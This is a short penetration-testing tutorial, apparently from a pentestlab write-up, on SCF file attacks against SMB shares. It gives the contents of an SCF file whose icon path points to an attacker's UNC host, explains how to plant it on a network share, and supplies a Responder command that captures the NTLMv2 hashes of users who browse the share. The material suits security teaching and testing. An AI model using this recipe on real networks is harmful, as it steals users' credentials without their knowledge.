# SMB

## SCF File Attacks

It is not new that SCF \(Shell Command Files\) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share.

```text
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

![](https://pentestlab.files.wordpress.com/2017/12/scf-file-contents.png?w=760)

Saving the pentestlab.txt file as SCF file will make the file to be executed when the user will browse the file. Adding the @ symbol in front of the filename will place the pentestlab.scf on the top of the share drive.SCF File

Responder needs to be executed with the following parameters to capture the hashes of the users that will browse the share.

```text
responder -wrf --lm -v -I eth0
```

 ![Responder - Parameters for SCF](https://pentestlab.files.wordpress.com/2017/12/responder-parameters-for-scf.png?w=760)

When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user. During that authentication process a random 8 byte challenge key is sent from the server to the client and the hashed NTLM/LANMAN password is encrypted again with this challenge key. Responder will capture the NTLMv2 hash.



